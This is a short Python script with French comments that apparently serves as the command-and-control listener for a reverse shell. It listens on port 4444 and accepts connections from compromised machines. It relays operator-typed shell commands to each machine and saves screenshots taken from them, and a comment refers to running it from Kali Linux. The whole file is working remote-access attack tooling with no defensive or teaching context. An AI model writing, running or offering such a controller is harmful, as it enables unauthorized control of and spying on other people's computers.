import socket
import os
import sys
import threading

HOST = "0.0.0.0"
PORT = 4444

def gerer_client(conn, addr):
    print(f"[+] Client connecte : {addr}")
    try:
        while True:
            cmd = input(f"Shell@{addr[0]} > ")
            if cmd.lower() in ['exit', 'quit']:
                conn.send(b'exit')
                break
            
            conn.send(cmd.encode('utf-8'))
            
            if cmd == "screenshot":
                data = conn.recv(1024 * 1024) 
                if data:
                    with open(f"screen_{addr[0]}.png", "wb") as f:
                        f.write(data)
                    print(f"[+] Capture sauvegardee dans screen_{addr[0]}.png")
            else:
                reponse = conn.recv(4096).decode('utf-8')
                print(reponse)
    except Exception as e:
        print(f"[-] Erreur : {e}")
    finally:
        conn.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Serveur en ecoute sur {HOST}:{PORT}")

    while True:
        conn, addr = server.accept()
        
       
        if os.name == 'nt':  
            thread = threading.Thread(target=gerer_client, args=(conn, addr))
            thread.daemon = True
            thread.start()
        else:  # Si on est sous Linux (Kali)
            pid = os.fork()
            if pid == 0:
                server.close()
                gerer_client(conn, addr)
                sys.exit(0)
            else:
                conn.close()

if __name__ == "__main__":
    main()